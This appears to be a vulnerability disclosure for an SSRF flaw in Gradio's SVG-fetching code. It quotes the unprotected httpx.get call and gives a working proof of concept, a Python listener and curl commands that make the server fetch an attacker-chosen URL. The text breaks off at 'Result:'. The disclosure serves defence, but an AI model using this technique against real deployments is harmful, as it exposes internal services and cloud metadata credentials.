### Summary

`extract_svg_content()` in `gradio/image_utils.py` fetches user-controlled URLs
via `httpx.get()` without any SSRF protection. When a Gradio application passes
a user-controlled URL ending in `.svg` to a `Gallery` or `Image` component, the
server makes an unconditional HTTP request to the supplied address — including
internal IPs and cloud metadata endpoints.

Confirmed on Gradio 6.9.0.

### Details

**Vulnerable code — `gradio/image_utils.py:252`:**

```python
if is_http_url_like(image_file):
    response = httpx.get(image_file)    # no SSRF protection
    response.raise_for_status()
    return response.text
```

`processing_utils.py` already uses `safehttpx` for SSRF protection — `image_utils.py` was overlooked.

### PoC

**Terminal 1 — attacker listener:**
```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import datetime
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print('[SSRF HIT]', datetime.datetime.now().strftime('%H:%M:%S'))
        print('User-Agent:', self.headers.get('User-Agent'))
        self.send_response(200)
        self.send_header('Content-Type','image/svg+xml')
        self.end_headers()
        self.wfile.write(b'<svg xmlns=\"http://www.w3.org/2000/svg\"><text>SSRF</text></svg>')
    def log_message(self, *a): pass
HTTPServer(('127.0.0.1', 7861), H).serve_forever()"
```

**Terminal 2 — trigger:**
```bash
EVENT_ID=$(curl -s -X POST http://127.0.0.1:7860/gradio_api/call/process \
  -H "Content-Type: application/json" \
  -d '{"data": ["http://127.0.0.1:7861/poc-test.svg"]}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['event_id'])") \
&& curl -s http://127.0.0.1:7860/gradio_api/call/process/$EVENT_ID
```

**Result:**